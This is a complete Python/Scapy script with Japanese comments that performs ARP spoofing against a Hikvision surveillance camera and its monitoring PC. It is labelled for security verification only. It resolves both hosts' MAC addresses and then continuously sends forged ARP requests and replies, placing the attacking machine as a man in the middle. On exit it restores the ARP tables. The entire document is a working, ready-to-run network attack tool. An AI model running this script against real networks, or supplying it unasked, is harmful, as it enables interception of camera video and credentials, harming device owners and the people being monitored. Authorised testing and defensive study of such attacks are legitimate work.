#!/usr/bin/env python3
"""
hik_arp_spoof.py - HIKVISION カメラ向け ARP Spoofing
セキュリティ検証用途専用

カメラと監視端末の間に中間者として割り込み、
双方の ARP テーブルを攻撃PCの MAC に書き換える。

Usage:
    python hik_arp_spoof.py --camera-ip 192.168.1.100 --monitor-ip 192.168.1.200
    python hik_arp_spoof.py --camera-ip 192.168.1.100 --monitor-ip 192.168.1.200 --iface "イーサネット"
    python hik_arp_spoof.py --camera-ip 192.168.1.100 --monitor-ip 192.168.1.200 --camera-mac AA:BB:CC:DD:EE:FF
"""

import argparse
import signal
import sys
import time

from scapy.all import (
    ARP, Ether, conf, get_if_hwaddr, sendp, srp,
)


def get_mac(ip, iface):
    """指定 IP の MAC アドレスを ARP リクエストで自動取得する"""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=5, iface=iface, verbose=False, retry=2,
    )
    if ans:
        return ans[0][1].hwsrc
    return None


def restore_arp(camera_ip, camera_mac, monitor_ip, monitor_mac, iface):
    """終了時に ARP テーブルを正しい状態に復元する"""
    print("\n[*] ARP テーブルを復元中...")
    # カメラへ: 監視端末の正しい MAC を通知
    sendp(
        Ether(dst=camera_mac, src=monitor_mac)
        / ARP(op=2, pdst=camera_ip, psrc=monitor_ip,
              hwsrc=monitor_mac, hwdst=camera_mac),
        iface=iface, count=5, inter=0.3, verbose=False,
    )
    # 監視端末へ: カメラの正しい MAC を通知
    sendp(
        Ether(dst=monitor_mac, src=camera_mac)
        / ARP(op=2, pdst=monitor_ip, psrc=camera_ip,
              hwsrc=camera_mac, hwdst=monitor_mac),
        iface=iface, count=5, inter=0.3, verbose=False,
    )
    print("[+] ARP テーブル復元完了")


def main():
    parser = argparse.ArgumentParser(
        description="HIKVISION カメラ向け ARP Spoofing (セキュリティ検証用)")
    parser.add_argument("--camera-ip", required=True,
                        help="監視カメラの IP アドレス")
    parser.add_argument("--monitor-ip", required=True,
                        help="監視端末 (ブラウザで閲覧する PC) の IP アドレス")
    parser.add_argument("--iface", default="イーサネット",
                        help="ネットワークインターフェース名 (デフォルト: イーサネット)")
    parser.add_argument("--camera-mac", default=None,
                        help="カメラの MAC アドレス (省略時は自動取得)")
    parser.add_argument("--monitor-mac", default=None,
                        help="監視端末の MAC アドレス (省略時は自動取得)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="ARP パケット送信間隔 (秒, デフォルト: 1.0)")
    args = parser.parse_args()

    # ---------- MAC アドレス解決 ----------
    try:
        my_mac = get_if_hwaddr(args.iface)
    except Exception as e:
        print(f"[!] インターフェース '{args.iface}' が見つかりません: {e}")
        sys.exit(1)

    camera_mac = args.camera_mac
    if not camera_mac:
        print(f"[*] カメラ ({args.camera_ip}) の MAC アドレスを取得中...")
        camera_mac = get_mac(args.camera_ip, args.iface)
        if not camera_mac:
            print("[!] カメラの MAC を取得できません。--camera-mac で手動指定してください。")
            sys.exit(1)

    monitor_mac = args.monitor_mac
    if not monitor_mac:
        print(f"[*] 監視端末 ({args.monitor_ip}) の MAC アドレスを取得中...")
        monitor_mac = get_mac(args.monitor_ip, args.iface)
        if not monitor_mac:
            print("[!] 監視端末の MAC を取得できません。--monitor-mac で手動指定してください。")
            sys.exit(1)

    # ---------- 情報表示 ----------
    print("=" * 55)
    print("  HIKVISION ARP Spoofing — セキュリティ検証")
    print("=" * 55)
    print(f"  攻撃PC    MAC : {my_mac}")
    print(f"  カメラ     IP : {args.camera_ip}")
    print(f"             MAC : {camera_mac}")
    print(f"  監視端末   IP : {args.monitor_ip}")
    print(f"             MAC : {monitor_mac}")
    print(f"  送信間隔       : {args.interval} 秒")
    print("=" * 55)
    print("[*] ARP Spoofing 開始  (Ctrl+C で終了 → 自動復元)")
    print()

    # ---------- Ctrl+C ハンドラ ----------
    def signal_handler(_sig, _frame):
        restore_arp(args.camera_ip, camera_mac,
                    args.monitor_ip, monitor_mac, args.iface)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    # ---------- ARP Spoof パケット生成 ----------
    # カメラに対して:「監視端末の IP は攻撃 PC の MAC ですよ」
    spoof_cam_req = (Ether(dst=camera_mac, src=my_mac)
                     / ARP(op=1, pdst=args.camera_ip,
                           psrc=args.monitor_ip, hwsrc=my_mac))
    spoof_cam_rep = (Ether(dst=camera_mac, src=my_mac)
                     / ARP(op=2, pdst=args.camera_ip,
                           psrc=args.monitor_ip, hwsrc=my_mac))

    # 監視端末に対して:「カメラの IP は攻撃 PC の MAC ですよ」
    spoof_mon_req = (Ether(dst=monitor_mac, src=my_mac)
                     / ARP(op=1, pdst=args.monitor_ip,
                           psrc=args.camera_ip, hwsrc=my_mac))
    spoof_mon_rep = (Ether(dst=monitor_mac, src=my_mac)
                     / ARP(op=2, pdst=args.monitor_ip,
                           psrc=args.camera_ip, hwsrc=my_mac))

    # ---------- メインループ ----------
    pkt_count = 0
    try:
        while True:
            sendp(spoof_cam_req, iface=args.iface, verbose=False)
            sendp(spoof_cam_rep, iface=args.iface, verbose=False)
            sendp(spoof_mon_req, iface=args.iface, verbose=False)
            sendp(spoof_mon_rep, iface=args.iface, verbose=False)
            pkt_count += 4
            if pkt_count % 40 == 0:
                print(f"  [spoof] {pkt_count} パケット送信済")
            time.sleep(args.interval)
    except KeyboardInterrupt:
        restore_arp(args.camera_ip, camera_mac,
                    args.monitor_ip, monitor_mac, args.iface)


if __name__ == "__main__":
    main()
